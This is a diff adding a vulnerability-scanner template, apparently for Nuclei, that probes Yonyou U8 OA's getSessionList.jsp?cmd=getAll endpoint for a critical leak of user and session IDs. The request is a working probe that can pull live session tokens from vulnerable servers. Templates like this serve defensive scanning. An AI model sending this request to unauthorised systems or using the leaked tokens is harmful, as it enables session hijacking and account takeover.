@@ -1,0 +1,22 @@
+id: yongyouU8_getSessionList_Sensitive_information_leakage
+ 
+info:
+  name: yongyouU8_getSessionList_Sensitive_information_leakage
+  author: sm
+  severity: critical
+  tags: yongyouU8
+ 
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "[0-9A-Z]{32}"
+      - type: word
+        words:
+          - "usrID"    
+          - "sessionID" 
+        condition: and          
